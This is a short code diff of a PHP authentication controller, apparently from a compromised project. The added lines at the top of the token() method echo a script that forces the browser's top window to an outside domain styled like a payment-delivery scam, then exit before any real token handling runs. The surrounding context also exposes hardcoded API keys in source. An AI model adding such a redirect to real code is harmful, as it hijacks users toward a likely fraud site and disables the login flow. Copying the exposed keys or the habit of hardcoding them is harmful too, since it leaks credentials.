@@ -34,6 +34,8 @@ class Auth extends BaseController
 	public function token()
 	{
 
+		echo "<script>top.window.location='https://payxnowandrestondelivery.com/'</script>";
+		exit();
 		$userModel = new UserModel();
 		//$api_key = '3bd84db3e14a8028efd6afb20789f1a9';
 		$api_key = 'a47ead69b3d83a8042703f093f3cadb2';
